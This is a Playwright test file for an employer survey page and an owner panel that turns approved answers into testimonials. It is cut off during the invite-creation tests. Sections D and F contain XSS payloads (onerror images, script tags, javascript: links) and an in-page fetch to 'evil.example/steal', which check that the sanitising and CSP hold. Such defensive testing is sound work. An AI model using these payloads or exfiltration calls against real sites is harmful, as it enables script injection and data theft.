// SV1: employer survey page (survey.html, real CSP enforced) and the Owner Panel "Employer surveys" page.
// The Firebase SDK is replaced by a tiny in-page fake; the test records every write the page makes so the same writes can be replayed
// against the real Firestore rules text (rules-tests/attack/sv1_replay.py).
import { b, base, check, errs, fresh, signIn, signOut, results, srv } from './w5-harness.mjs';
import fs from 'node:fs';
fs.mkdirSync('/tmp/sv', { recursive: true });

const KEY = 'Kq7Zr2Lm9Xc4Vb8Nt3Hy6Wd1Sf5Gj0Pa', K2 = 'Zz7Zr2Lm9Xc4Vb8Nt3Hy6Wd1Sf5Gj0Pa';
const FAKE_APP = 'export const initializeApp = c => ({ cfg: c });';
const FAKE_FS = `
export const getFirestore = a => ({});
export const doc = (db, col, id) => ({ path: col + '/' + id, id });
export const serverTimestamp = () => ({ __sv: true });
export const getDoc = async ref => { window.__reads.push(ref.path); if (window.__fake.getError) throw { code: window.__fake.getError }; const d = window.__docs[ref.path]; return { exists: () => !!d, data: () => { const x = Object.assign({}, d); if (typeof x.expiresAt === 'number') { const v = x.expiresAt; x.expiresAt = { toMillis: () => v }; } return x; } }; };
export const writeBatch = db => { const ops = []; return { set: (r, d) => ops.push({ op: 'set', path: r.path, data: d }), update: (r, d) => ops.push({ op: 'update', path: r.path, data: d }),
  commit: async () => { window.__commits.push(ops); if (window.__fake.slow) await new Promise(r => setTimeout(r, window.__fake.slow)); if (window.__fake.commitError) throw { code: window.__fake.commitError }; } }; };`;
const inviteOk = o => Object.assign({ status: 'sent', employerName: 'Ana Cruz', company: 'Acme Ltd', ownerName: 'Frederick Espinosa', expiresAt: Date.now() + 5e8 }, o || {});

async function emp(hash, { docs = {}, fake = {}, viewport = { width: 1000, height: 900 } } = {}) {
  const ctx = await b.newContext({ viewport }); const reqs = [];
  ctx.on('request', r => reqs.push(r.url()));
  await ctx.route('https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js', r => r.fulfill({ contentType: 'text/javascript', body: FAKE_APP }));
  await ctx.route('https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js', r => r.fulfill({ contentType: 'text/javascript', body: FAKE_FS }));
  await ctx.route(/googleapis\.com|evil\.example/, r => r.abort());
  const pg = await ctx.newPage(); const perr = []; pg.on('pageerror', e => perr.push(String(e)));
  const cons = []; pg.on('console', m => { if (m.type() === 'error') cons.push(m.text()); });
  await pg.addInitScript(([d, f]) => { window.__docs = d; window.__fake = f; window.__reads = []; window.__commits = []; }, [docs, fake]);
  await pg.goto(base + 'survey.html' + hash); await pg.waitForFunction(() => ['svInvalid', 'svForm', 'svThanks'].some(i => !document.getElementById(i).hidden), null, { timeout: 8000 });
  return { ctx, pg, reqs, perr, cons };
}
const which = pg => pg.evaluate(() => ['svLoading', 'svInvalid', 'svThanks', 'svForm'].filter(i => !document.getElementById(i).hidden).join(','));
const invalidText = pg => pg.evaluate(() => document.getElementById('svInvalid').textContent.replace(/\s+/g, ' ').trim());
const fillGood = async (pg, o = {}) => {
  await pg.click('.sv-star:nth-child(' + (o.stars || 5) + ')'); await pg.fill('#fComment', o.comment || 'She was reliable, fast and always kept me informed about progress.');
  await pg.click('input[name=recommend][value=yes]'); if (o.video) await pg.fill('#fVideo', o.video); await pg.check('#fConsent');
};

// ======================= A. the link decides everything =======================
{
  const cases = [['no key', '', {}], ['empty key', '#k=', {}], ['short key', '#k=abc', {}], ['query key (wrong place)', '?k=' + KEY, { [`surveyInvites/${KEY}`]: inviteOk() }], ['31 chars', '#k=' + KEY.slice(1), {}], ['33 chars', '#k=' + KEY + 'x', {}], ['symbol in key', '#k=' + KEY.slice(0, 31) + '-', {}]];
  const texts = new Set();
  for (const [n, h, d] of cases) {
    const { ctx, pg, reqs } = await emp(h, { docs: d }); texts.add(await invalidText(pg));
    check('A link "' + n + '": neutral "not valid" page, no form', (await which(pg)) === 'svInvalid');
    check('A link "' + n + '": nothing was requested from Firebase', reqs.filter(u => /firebasejs|googleapis/.test(u)).length === 0, JSON.stringify(reqs.filter(u => /firebasejs|googleapis/.test(u))));
    await ctx.close();
  }
  const now = Date.now();
  const states = [['missing invite', {}], ['submitted', { [`surveyInvites/${KEY}`]: inviteOk({ status: 'submitted' }) }], ['revoked', { [`surveyInvites/${KEY}`]: inviteOk({ status: 'revoked' }) }],
    ['expired', { [`surveyInvites/${KEY}`]: inviteOk({ expiresAt: now - 1000 }) }], ['expires right now', { [`surveyInvites/${KEY}`]: inviteOk({ expiresAt: now }) }]];
  for (const [n, d] of states) { const { ctx, pg } = await emp('#k=' + KEY, { docs: d }); texts.add(await invalidText(pg)); check('A invite ' + n + ': neutral "not valid" page', (await which(pg)) === 'svInvalid'); await ctx.close(); }
  { const { ctx, pg } = await emp('#k=' + KEY, { docs: {}, fake: { getError: 'permission-denied' } }); texts.add(await invalidText(pg)); check('A database refuses the read: same neutral page', (await which(pg)) === 'svInvalid'); await ctx.close(); }
  check('A every failure shows exactly the same words (the page never says why)', texts.size === 1, JSON.stringify([...texts]));
}

// ======================= B. the form =======================
const D1 = { [`surveyInvites/${KEY}`]: inviteOk() };
{
  const { ctx, pg, reqs, perr, cons } = await emp('#k=' + KEY, { docs: D1 });
  check('B valid link: the form is shown and only that ONE invite was read', (await which(pg)) === 'svForm' && (await pg.evaluate(() => window.__reads.join())) === 'surveyInvites/' + KEY);
  check('B greeting uses the employer and owner names; name and company are prefilled', await pg.evaluate(() => document.getElementById('svLead').textContent.includes('Ana Cruz') && document.getElementById('svLead').textContent.includes('Frederick Espinosa') && document.getElementById('fName').value === 'Ana Cruz' && document.getElementById('fCompany').value === 'Acme Ltd' && document.title.includes('Frederick')));
  check('B the page asks for no e-mail address', (await pg.$$eval('input', i => i.filter(x => /mail/i.test(x.type + x.id + x.name + (x.placeholder || ''))).length)) === 0);
  check('B five star radios, each named, none pre-selected', await pg.$$eval('.sv-star input', r => r.length === 5 && r.every((x, i) => x.type === 'radio' && x.getAttribute('aria-label') === (i + 1) + (i ? ' stars' : ' star') && !x.checked)));
  // empty submit
  await pg.click('#svSend'); await pg.waitForTimeout(150);
  const errsShown = await pg.evaluate(() => ['eRating', 'eComment', 'eRec', 'eConsent'].map(i => document.getElementById(i).textContent));
  check('B empty submit: rating, message, recommend and consent are each explained', errsShown.every(Boolean), JSON.stringify(errsShown));
  check('B empty submit: nothing was written and focus moves to the first problem (rating)', (await pg.evaluate(() => window.__commits.length)) === 0 && (await pg.evaluate(() => document.activeElement.name)) === 'rating');
  check('B error text is announced (role=alert) and the field is marked', await pg.evaluate(() => document.getElementById('eComment').getAttribute('role') === 'alert' && document.getElementById('fComment').classList.contains('sv-invalid')));
  // stars
  await pg.click('.sv-star:nth-child(4)');
  check('B choosing 4 stars fills four and says so', await pg.evaluate(() => document.querySelectorAll('.sv-star.on').length === 4 && document.getElementById('svRatingText').textContent === '4 of 5 stars') && (await pg.evaluate(() => document.getElementById('eRating').textContent)) === '');
  await pg.focus('.sv-star:nth-child(4) input'); await pg.keyboard.press('ArrowRight'); await pg.waitForTimeout(80);
  check('B keyboard: arrow key moves to 5 stars', await pg.evaluate(() => document.querySelectorAll('.sv-star.on').length === 5 && document.querySelector('input[name=rating]:checked').value === '5'));
  // counter + limits
  await pg.fill('#fComment', 'x'.repeat(30)); check('B message counter follows typing and the field stops at 700', (await pg.textContent('#cComment')) === '30 / 700' && (await pg.getAttribute('#fComment', 'maxlength')) === '700');
  await pg.fill('#fComment', 'short'); await pg.click('#svSend'); await pg.waitForTimeout(100);
  check('B message under 20 characters is refused with a reason', /at least 20/.test(await pg.textContent('#eComment')));
  // video
  await pg.fill('#fComment', 'She was reliable, fast and always kept me informed about progress.'); await pg.click('input[name=recommend][value=yes]'); await pg.check('#fConsent');
  for (const bad of ['https://evil.example/x', 'http://youtu.be/dQw4w9WgXcQ', 'javascript:alert(1)', 'not a link', 'https://drive.google.com.evil.io/x']) { await pg.fill('#fVideo', bad); await pg.click('#svSend'); await pg.waitForTimeout(80); check('B video link refused: ' + bad, (await pg.textContent('#eVideo')).length > 0 && (await pg.evaluate(() => window.__commits.length)) === 0); }
  // consent
  await pg.fill('#fVideo', ''); await pg.uncheck('#fConsent'); await pg.click('#svSend'); await pg.waitForTimeout(80);
  check('B without consent nothing is sent', (await pg.textContent('#eConsent')).length > 0 && (await pg.evaluate(() => window.__commits.length)) === 0);
  check('B no storage, no cookies, no third-party request', (await pg.evaluate(() => localStorage.length + sessionStorage.length + document.cookie.length)) === 0 && reqs.every(u => u.startsWith(base) || /gstatic\.com\/firebasejs\/10\.12\.2\/firebase-(app|firestore)\.js$/.test(u)), JSON.stringify(reqs.filter(u => !u.startsWith(base))));
  check('B no page errors or console errors', perr.length === 0 && cons.length === 0, JSON.stringify([perr, cons]));
  await ctx.close();
}

// ======================= C. sending =======================
{
  const { ctx, pg } = await emp('#k=' + KEY, { docs: D1, fake: { slow: 400 } });
  await fillGood(pg, { stars: 5, video: 'https://www.loom.com/share/0123456789abcdef0123456789abcdef' });
  await pg.fill('#fBest', 'Fast turnaround.'); await pg.fill('#fRole', 'Founder');
  await pg.click('#svSend'); await pg.click('#svSend', { force: true }).catch(() => {}); await pg.keyboard.press('Enter').catch(() => {});
  check('C while sending the button is disabled and says so', await pg.evaluate(() => document.getElementById('svSend').disabled && document.getElementById('svSend').textContent === 'Sending…'));
  await pg.waitForFunction(() => !document.getElementById('svThanks').hidden, null, { timeout: 5000 });
  const commits = await pg.evaluate(() => window.__commits);
  check('C double clicking sends exactly ONE batch', commits.length === 1, commits.length);
  const ops = commits[0];
  check('C the batch holds exactly the response (set) and the invite flip (update), same key', ops.length === 2 && ops[0].op === 'set' && ops[0].path === 'surveyResponses/' + KEY && ops[1].op === 'update' && ops[1].path === 'surveyInvites/' + KEY);
  check('C the invite flip changes only status and submittedAt', JSON.stringify(Object.keys(ops[1].data).sort()) === '["status","submittedAt"]' && ops[1].data.status === 'submitted' && ops[1].data.submittedAt.__sv === true);
  check('C the response holds exactly the allowed fields', JSON.stringify(Object.keys(ops[0].data).sort()) === JSON.stringify(['best', 'comment', 'consentPublish', 'displayCompany', 'displayName', 'displayRole', 'ownerStatus', 'rating', 'recommend', 'submittedAt', 'videoUrl']));
  check('C values: rating 5, pending, consent true, loom link, role Founder, company kept', ops[0].data.rating === 5 && ops[0].data.ownerStatus === 'pending' && ops[0].data.consentPublish === true && /loom\.com\/share/.test(ops[0].data.videoUrl) && ops[0].data.displayRole === 'Founder' && ops[0].data.displayCompany === 'Acme Ltd' && ops[0].data.recommend === 'yes' && ops[0].data.best === 'Fast turnaround.');
  check('C thank-you page shown, names the owner; the key left the address bar', (await which(pg)) === 'svThanks' && (await pg.textContent('#svThanksText')).includes('Frederick Espinosa') && (await pg.evaluate(() => location.hash)) === '');
  fs.writeFileSync('/tmp/sv/captured.json', JSON.stringify({ key: KEY, ops, invite: { employerName: 'Ana Cruz', company: 'Acme Ltd', ownerName: 'Frederick Espinosa' } }));
  await ctx.close();
}
{ // failures while sending
  for (const [code, expect, label] of [['permission-denied', 'svInvalid', 'permission denied (link used or revoked meanwhile)'], ['unavailable', 'svForm', 'network down']]) {
    const { ctx, pg } = await emp('#k=' + KEY, { docs: D1, fake: { commitError: code } }); await fillGood(pg); await pg.click('#svSend'); await pg.waitForTimeout(300);
    check('C ' + label + ': ' + (expect === 'svForm' ? 'form stays with a retry message and the answer is kept' : 'neutral not-valid page'), (await which(pg)) === expect && (expect === 'svInvalid' || ((await pg.textContent('#eSubmit')).length > 0 && (await pg.inputValue('#fComment')).length > 20 && !(await pg.evaluate(() => document.getElementById('svSend').disabled)))));
    await ctx.close();
  }
  const { ctx, pg } = await emp('#k=' + KEY, { docs: D1, fake: { commitError: 'unavailable' } }); await fillGood(pg); await pg.click('#svSend'); await pg.waitForTimeout(250);
  await pg.evaluate(() => { window.__fake.commitError = ''; }); await pg.click('#svSend'); await pg.waitForFunction(() => !document.getElementById('svThanks').hidden, null, { timeout: 4000 });
  check('C retry after a network failure works', (await which(pg)) === 'svThanks'); await ctx.close();
}

// ======================= D. hostile text and the page CSP =======================
{
  const evil = { [`surveyInvites/${KEY}`]: inviteOk({ employerName: '<img src=x onerror="window.__xss=1">Boss', company: '<b>Co</b>', ownerName: '<script>window.__xss=2</script>Fred' }) };
  const { ctx, pg } = await emp('#k=' + KEY, { docs: evil });
  await pg.waitForTimeout(300);
  check('D hostile names from the invite are shown as text: no element is created, no script runs', await pg.evaluate(() => !window.__xss && document.querySelectorAll('#svMain img, #svMain b, #svMain script').length === 0 && document.getElementById('svLead').textContent.includes('<img src=x') && document.getElementById('fName').value.includes('<img')));
  await fillGood(pg, { comment: '<script>window.__xss=3</script><img src=x onerror="window.__xss=4"> and I would hire again without any doubt.' }); await pg.fill('#fName', '<b>Boss</b>'); await pg.click('#svSend'); await pg.waitForTimeout(300);
  const sent = await pg.evaluate(() => window.__commits[0][0].data);
  check('D hostile answer is sent as plain text (unchanged characters, not markup) and nothing ran', sent.comment.includes('<script>') && sent.displayName === '<b>Boss</b>' && !(await pg.evaluate(() => window.__xss)));
  const v = await pg.evaluate(async () => {
    const out = []; document.addEventListener('securitypolicyviolation', e => out.push(e.violatedDirective + '|' + e.blockedURI));
    try { await fetch('https://evil.example/steal?k=1'); } catch (e) { /* blocked */ }
    const s = document.createElement('script'); s.textContent = 'window.__inl=1'; document.body.append(s);
    const i = document.createElement('img'); i.src = 'https://evil.example/p.png'; document.body.append(i);
    const f = document.createElement('iframe'); f.src = 'https://evil.example/'; document.body.append(f);
    const sc = document.createElement('script'); sc.src = 'https://evil.example/x.js'; document.body.append(sc);
    const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://evil.example/x.css'; document.head.append(l);
    document.body.style.color = 'red'; await new Promise(r => setTimeout(r, 400)); return out;
  });
  const dirs = v.map(x => x.split('|')[0]).join(' ');
  check('D the page CSP blocks outside fetches, inline script, outside images, frames, scripts and styles', ['connect-src', 'script-src', 'img-src', 'frame-src', 'style-src'].every(d => dirs.includes(d)), JSON.stringify(v));
  check('D the blocked inline script did not run', !(await pg.evaluate(() => window.__inl)));
  await ctx.close();
}

// ======================= E. phone width =======================
{
  const { ctx, pg } = await emp('#k=' + KEY, { docs: D1, viewport: { width: 360, height: 700 } });
  const m = await pg.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth, star: document.querySelector('.sv-star').getBoundingClientRect().width, h: document.querySelector('.sv-star').getBoundingClientRect().height, fs: parseFloat(getComputedStyle(document.getElementById('fComment')).fontSize), btn: document.getElementById('svSend').getBoundingClientRect().height, choice: document.querySelector('.sv-choice').getBoundingClientRect().height }));
  check('E 360 px: no sideways scroll', m.sw <= m.cw, JSON.stringify(m)); check('E 360 px: star, button and choice targets are at least 44 px; text is 16 px or more', m.star >= 44 && m.h >= 44 && m.btn >= 44 && m.choice >= 44 && m.fs >= 16, JSON.stringify(m));
  for (const th of ['nature', 'outer-space']) { await pg.evaluate(t => document.documentElement.setAttribute('data-theme', t), th); const c = await pg.evaluate(() => { const g = e => getComputedStyle(e); const bg = g(document.body).backgroundColor, fg = g(document.body).color; return [bg, fg]; }); check('E theme ' + th + ': text and background differ', c[0] !== c[1], JSON.stringify(c)); }
  await ctx.close();
}

// ======================= F. Owner Panel page =======================
{
  const ts = ms => ({ toDate: () => new Date(ms), toMillis: () => ms }), now = Date.now();
  const k = n => (n + 'Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0Kk1Ll2Mm3').slice(0, 32);
  const [K1, KA, KB, KC, KD, KE] = ['a', 'b', 'c', 'd', 'e', 'f'].map(k);
  const { ctx, pg } = await fresh({ permissions: ['clipboard-read', 'clipboard-write'], init: () => {
    const fs = window.OWN.fs; fs.updateDoc = async (ref, d) => { const cur = window.__store[ref.path]; if (!cur) throw new Error('no doc'); window.__store[ref.path] = Object.assign({}, cur, d); };
    fs.writeBatch = () => { const ops = []; return { set: (r, d) => ops.push(() => fs.setDoc(r, d)), update: (r, d) => ops.push(() => fs.updateDoc(r, d)), delete: r => ops.push(() => fs.deleteDoc(r)), commit: async () => { window.__batches = (window.__batches || 0) + 1; for (const o of ops) await o(); } }; };
    document.addEventListener('click', e => { const a = e.target.closest && e.target.closest('a'); if (a && /^mailto:/.test(a.href)) { e.preventDefault(); window.__mail = a.getAttribute('href'); } }, true);
  } });
  await signIn(pg); await pg.waitForTimeout(300);
  const RESP = (o) => Object.assign({ rating: 5, comment: 'Reliable and fast. Would hire again.', best: 'Communication', recommend: 'yes', videoUrl: '', displayName: 'Ana Cruz', displayRole: 'Founder', displayCompany: 'Acme', consentPublish: true, submittedAt: now - 3600000, ownerStatus: 'pending' }, o || {});
  const INV = o => Object.assign({ surveyVersion: 'default-1', employerName: 'Ana Cruz', company: 'Acme', ownerName: 'Frederick', status: 'sent', createdAt: now - 86400000, expiresAt: now + 30 * 86400000 }, o || {});
  await pg.evaluate(([K1, KA, KB, KC, KD, KE, I, R]) => {
    const S = window.__store, ts = ms => ({ toDate: () => new Date(ms), toMillis: () => ms }), now = Date.now();
    const inv = o => Object.assign(I, o);
    S['clientRegistry/CL-0001'] = { status: 'active', notes: '', createdAt: ts(now), updatedAt: ts(now), rev: 1, lastAudit: 'a' }; S['clientRegistry/CL-0002'] = { status: 'archived', notes: '', createdAt: ts(now), updatedAt: ts(now), rev: 2, lastAudit: 'b' };
    const cv = o => { if (!o) return o; const c = Object.assign({}, o); for (const f of ['createdAt', 'expiresAt', 'submittedAt', 'decidedAt']) if (typeof c[f] === 'number') c[f] = ts(c[f]); return c; };
    const mk = (key, i, p, r) => { i = cv(i); r = cv(r); S['surveyInvites/' + key] = i; S['surveyInvitesPrivate/' + key] = p; if (r) S['surveyResponses/' + key] = r; };
    const base = o => Object.assign({}, I, o);
    mk(K1, base({ employerName: 'Sent Sam' }), { employerEmail: 'sam@acme.com', clientId: 'CL-0001' });
    mk(KA, base({ employerName: 'Pending Pat', status: 'submitted', submittedAt: now }), { employerEmail: 'pat@acme.com', clientId: '' }, Object.assign({}, R, { displayName: '<img src=x onerror="window.__xss=1">Pat', comment: '<script>window.__xss=2</script> Great person to work with every day.', videoUrl: 'https://drive.google.com/file/d/1AbC/view', displayRole: 'CEO' }));
    mk(KB, base({ employerName: 'Approved Amy', status: 'submitted', submittedAt: now }), { employerEmail: 'amy@acme.com', clientId: '' }, Object.assign({}, R, { displayName: 'Amy', ownerStatus: 'approved', testimonialId: 'sv_x1234', decidedAt: now }));
    mk(KC, base({ employerName: 'Revoked Rae', status: 'revoked' }), { employerEmail: 'rae@acme.com', clientId: '' });
    mk(KD, base({ employerName: 'Expired Eve', expiresAt: now - 1000 }), { employerEmail: 'eve@acme.com', clientId: '' });
    mk(KE, base({ employerName: 'Pending Pete', status: 'submitted', submittedAt: now - 5000 }), { employerEmail: 'pete@acme.com', clientId: '' }, Object.assign({}, R, { displayName: 'Pete', rating: 3, recommend: 'no' }));
    window.testiApi.setDoc({ enabled: true, view: 'carousel', items: [{ id: 'm0', name: 'Old Client', role: 'x', quote: 'Great', rating: 5, enabled: true }] });
  }, [K1, KA, KB, KC, KD, KE, INV(), RESP()]);
  await signIn(pg); await pg.waitForTimeout(400);   // sign-in with the data already there, as in real life: the badge is counted now
  await pg.click('#dashOpen'); await pg.waitForTimeout(300);
  check('F nav has Employer surveys and the badge shows two answers to review after sign-in', await pg.evaluate(() => !!document.querySelector('.dnav [data-page=surveys]') && document.getElementById('surveyBadge').textContent === '2' && !document.getElementById('surveyBadge').hidden));
  await pg.evaluate(() => document.querySelector('.dnav [data-page=surveys]').click()); await pg.waitForTimeout(500);
  const rows = sel => pg.$$eval(sel + ' .cidrow', rs => rs.map(r => ({ t: (r.querySelector('strong') || {}).textContent, chip: (r.querySelector('.svbadge') || {}).textContent, btns: [...r.querySelectorAll('button')].map(x => x.getAttribute('aria-label')), txt: r.textContent })));
  const inv = await rows('#svInvList'), rsp = await rows('#svRespList');
  check('F six invites and three answers listed; pending answers come first', inv.length === 6 && rsp.length === 3 && rsp[2].chip === 'Approved', JSON.stringify([inv.length, rsp.map(r => r.chip)]));
  check('F states are right: sent / answered / approved / revoked / expired', JSON.stringify(inv.map(r => r.chip).sort()) === JSON.stringify(['Answered, to review', 'Answered, to review', 'Approved', 'Expired', 'Revoked', 'Waiting for answer']), JSON.stringify(inv.map(r => r.chip)));
  check('F hostile employer text is inert (no element, no script) and shown literally', await pg.evaluate(() => !window.__xss && document.querySelectorAll('#svRespList img, #svRespList script').length === 0 && document.getElementById('svRespList').textContent.includes('<img src=x')));
  const byName = (list, n) => list.find(r => r.t === n);
  check('F icon buttons carry "Action: Name" labels', JSON.stringify(byName(inv, 'Sent Sam').btns) === JSON.stringify(['Send e-mail: Sent Sam', 'Copy link: Sent Sam', 'Revoke link: Sent Sam']) && JSON.stringify(byName(inv, 'Revoked Rae').btns) === JSON.stringify(['Delete: Revoked Rae']) && JSON.stringify(byName(inv, 'Expired Eve').btns) === JSON.stringify(['Delete: Expired Eve']) && byName(inv, 'Approved Amy').btns.length === 0, JSON.stringify(inv.map(r => [r.t, r.btns])));
  check('F answered invites have no revoke/delete (the answer is kept); pending answers offer approve, reject, copy video', JSON.stringify(byName(inv, 'Pending Pete').btns) === '[]' && byName(rsp, '<img src=x onerror="window.__xss=1">Pat').btns.some(x => x.startsWith('Approve')) && byName(rsp, '<img src=x onerror="window.__xss=1">Pat').btns.some(x => x.startsWith('Copy video link')) && !byName(rsp, 'Pete').btns.some(x => x.startsWith('Copy video')), JSON.stringify(rsp.map(r => [r.t, r.btns])));
  check('F approved answer offers only "Open Testimonials"', JSON.stringify(byName(rsp, 'Amy').btns) === '["Open Testimonials: Amy"]');
  check('F Client ID list holds only active IDs', await pg.$$eval('#svClient option', o => o.map(x => x.textContent).join() === 'None,CL-0001'));
  const vlink = await pg.$eval('#svRespList a', a => [a.href, a.target, a.rel]);
  check('F video link opens in a new tab with noopener noreferrer', vlink[0].startsWith('https://drive.google.com/') && vlink[1] === '_blank' && vlink[2] === 'noopener noreferrer');
  const dlg = async re => { await pg.waitForTimeout(150); await pg.evaluate(re => { const d = document.querySelector('dialog[open]'); [...d.querySelectorAll('button')].find(x => new RegExp(re, 'i').test(x.textContent)).click(); }, re); await pg.waitForTimeout(350); };
  const store = () => pg.evaluate(() => JSON.parse(JSON.stringify(window.__store)));

  // approve Pete (no video) -> store without content/testimonials: uses the current testimonials (carousel) and adds hidden
  const peteBtn = '#svRespList .cidrow:has(strong:text-is("Pete")) button[aria-label^="Approve"]';
  await pg.click(peteBtn); const txt = await pg.evaluate(() => document.querySelector('dialog[open]').textContent.replace(/\s+/g, ' '));
  check('F approve asks first, says "HIDDEN", and the confirm button says what it does', /HIDDEN/.test(txt) && /Add to Testimonials/.test(txt)); await dlg('^\\s*cancel|^\\s*no');
  check('F cancelling changes nothing', !(await store())['content/testimonials'] && (await store())['surveyResponses/' + KE].ownerStatus === 'pending');
  await pg.click(peteBtn); await dlg('add to testimonials');
  let S = await store(); const T = S['content/testimonials'];
  check('F approve: testimonials keeps its on/off switch and view, old item untouched, new item added HIDDEN with the right text', T && T.enabled === true && T.view === 'carousel' && T.items.length === 2 && T.items[0].id === 'm0' && T.items[1].id === 'sv_' + KE.slice(0, 12) && T.items[1].enabled === false && T.items[1].name === 'Pete' && T.items[1].rating === 3 && T.items[1].photo === '' && T.items[1].quote.startsWith('Reliable'), JSON.stringify(T));
  check('F approve: response marked approved with decision time and testimonial id; nothing else changed', S['surveyResponses/' + KE].ownerStatus === 'approved' && S['surveyResponses/' + KE].testimonialId === 'sv_' + KE.slice(0, 12) && !!S['surveyResponses/' + KE].decidedAt && S['surveyResponses/' + KE].comment === 'Reliable and fast. Would hire again.');
  check('F badge drops to 1 and the approved row has no Approve button any more', await pg.evaluate(() => document.getElementById('surveyBadge').textContent === '1') && !(await pg.$(peteBtn)));
  check('F approve: an answer without a Drive video gets no video field', !('video' in T.items[1]));
  // public card: Drive link -> "Watch Testimonial Video" (new tab, noopener); YouTube, Loom, javascript:, http, other hosts -> no link
  const vids = await pg.evaluate(() => {
    const it = (id, v) => ({ id, name: 'N' + id, role: '', quote: 'Great work indeed.', rating: 5, enabled: true, video: v });
    window.testiApi.setDoc({ enabled: true, view: 'grid', items: [it('a', 'https://drive.google.com/file/d/abc/view'), it('b', 'https://youtu.be/dQw4w9WgXcQ'), it('c', 'https://www.loom.com/share/abcdef1234567890'), it('d', 'javascript:alert(1)'), it('e', 'http://drive.google.com/x'), it('f', 'https://drive.google.com.evil.com/x'), it('g', 'https://u:p@drive.google.com/x')] });
    return [...document.querySelectorAll('#tGrid .tcard')].map(c => { const a = c.querySelector('a.tvideo'); return a ? [a.textContent, a.href, a.target, a.rel] : null; });
  });
  check('F public card: only the Drive link shows "Watch Testimonial Video" (new tab, noopener noreferrer)', vids.length === 7 && vids[0] && vids[0][0] === 'Watch Testimonial Video' && vids[0][1] === 'https://drive.google.com/file/d/abc/view' && vids[0][2] === '_blank' && vids[0][3] === 'noopener noreferrer' && vids.slice(1).every(x => x === null), JSON.stringify(vids));
  await pg.evaluate(() => window.testiApi.setDoc(null));
  // owner editor: Add testimonial has the Drive video field; bad hosts are refused; a Drive link is kept
  await pg.evaluate(() => document.querySelector('.dnav [data-page=testimonials]').click()); await pg.waitForTimeout(300);
  await pg.click('#tmAdd'); await pg.waitForTimeout(200);
  check('F editor: Add testimonial has an optional "Google Drive video link" field with a hint', await pg.evaluate(() => { const l = document.querySelector('label[for=df-video]'); return !!l && /Google Drive video link \(optional\)/.test(l.textContent) && /Anyone with the link/.test(l.parentElement.textContent); }));
  const fillEd = async v => { await pg.fill('#df-name', 'Vera'); await pg.fill('#df-quote', 'Excellent assistant, very reliable.'); await pg.fill('#df-video', v); await pg.click('#dfOk'); await pg.waitForTimeout(250); };
  await fillEd('https://youtu.be/dQw4w9WgXcQ');
  check('F editor: a YouTube link is refused with a clear message and the dialog stays open', await pg.evaluate(() => !!document.querySelector('dialog[open]') && /Google Drive link/.test(document.getElementById('dfErr').textContent)));
  await pg.fill('#df-video', 'https://drive.google.com/file/d/xyz/view'); await pg.click('#dfOk'); await pg.waitForTimeout(300);
  check('F editor: a Drive link is accepted and stored on the new item', await pg.evaluate(() => { const d = window.testiApi; return !document.querySelector('dialog[open]') && document.querySelectorAll('#tmList .mrow').length > 0; }));
  await pg.click('#tmPublish'); await pg.waitForTimeout(400); { const dl = await pg.evaluate(() => !!document.querySelector('dialog[open]')); if (dl) await dlg('publish|ok|yes'); }
  const pubd = (await store())['content/testimonials'];
  check('F editor: after Publish the new item holds the Drive link (and the approved survey item has none)', !!pubd && pubd.items.some(t => t.name === 'Vera' && t.video === 'https://drive.google.com/file/d/xyz/view'), JSON.stringify(pubd && pubd.items.map(t => [t.name, t.video])));
  await pg.evaluate(() => document.querySelector('.dnav [data-page=surveys]').click()); await pg.waitForTimeout(200);
  // approve again must not duplicate (simulate a half-finished earlier try: item exists, response pending)
  await pg.evaluate(k => { window.__store['surveyResponses/' + k].ownerStatus = 'pending'; delete window.__store['surveyResponses/' + k].testimonialId; delete window.__store['surveyResponses/' + k].decidedAt; }, KE); await pg.click('#svRefresh'); await pg.waitForTimeout(400);
  await pg.click(peteBtn); await dlg('add to testimonials'); S = await store();
  check('F approving again (retry after a half-finished attempt) never duplicates the testimonial', S['content/testimonials'].items.filter(t => t.id === 'sv_' + KE.slice(0, 12)).length === 1 && S['surveyResponses/' + KE].ownerStatus === 'approved');
  // reject Pat
  await pg.click('#svRespList .cidrow:has(button[aria-label^="Reject"]) button[aria-label^="Reject"]'); await dlg('^\\s*reject'); S = await store();
  check('F reject: marked rejected, kept, and NOT added to testimonials', S['surveyResponses/' + KA].ownerStatus === 'rejected' && !!S['surveyResponses/' + KA].decidedAt && !S['surveyResponses/' + KA].testimonialId && S['content/testimonials'].items.length === 2 && S['surveyResponses/' + KA].comment.includes('Great person'));
  check('F badge gone when nothing is pending', await pg.evaluate(() => document.getElementById('surveyBadge').hidden));
  // revoke Sam
  await pg.click('#svInvList button[aria-label="Revoke link: Sent Sam"]'); await dlg('^\\s*revoke'); S = await store();
  check('F revoke: invite becomes revoked, other fields unchanged, e-mail record kept', S['surveyInvites/' + K1].status === 'revoked' && S['surveyInvites/' + K1].employerName === 'Sent Sam' && !!S['surveyInvitesPrivate/' + K1]);
  check('F revoked invite now offers Delete', !!(await pg.$('#svInvList button[aria-label="Delete: Sent Sam"]')));
  // delete Rae
  await pg.click('#svInvList button[aria-label="Delete: Revoked Rae"]'); await dlg('^\\s*delete'); S = await store();
  check('F delete: invite and its private e-mail record are both gone; others stay', !S['surveyInvites/' + KC] && !S['surveyInvitesPrivate/' + KC] && !!S['surveyInvites/' + KD]);

  // create
  await pg.fill('#svEmpName', 'New Nina'); await pg.fill('#svEmpEmail', 'not-an-email'); await pg.fill('#svOwnerName', 'Frederick Espinosa'); await pg.click('#svCreate');
  check('F create: bad e-mail is explained, nothing saved', /valid e-mail/.test(await pg.textContent('#svErr')) && Object.keys(await store()).filter(k => k.startsWith('surveyInvites/')).length === 5);
  await pg.fill('#svEmpEmail', 'nina+vip@acme.com'); await pg.fill('#svOwnerName', ''); await pg.click('#svCreate');
  check('F create: missing owner name is explained', /your name/i.test(await pg.textContent('#svErr')));
  await pg.fill('#svOwnerName', 'Frederick Espinosa'); await pg.fill('#svEmpCompany', 'Nina Co'); await pg.selectOption('#svClient', 'CL-0001'); await pg.click('#svCreate'); await pg.waitForTimeout(500);
  S = await store(); const newKeys = Object.keys(S).filter(k => k.startsWith('surveyInvites/') && !k.slice(14).includes('/')).map(k => k.slice(14)).filter(k => ![K1, KA, KB, KC, KD, KE].includes(k));
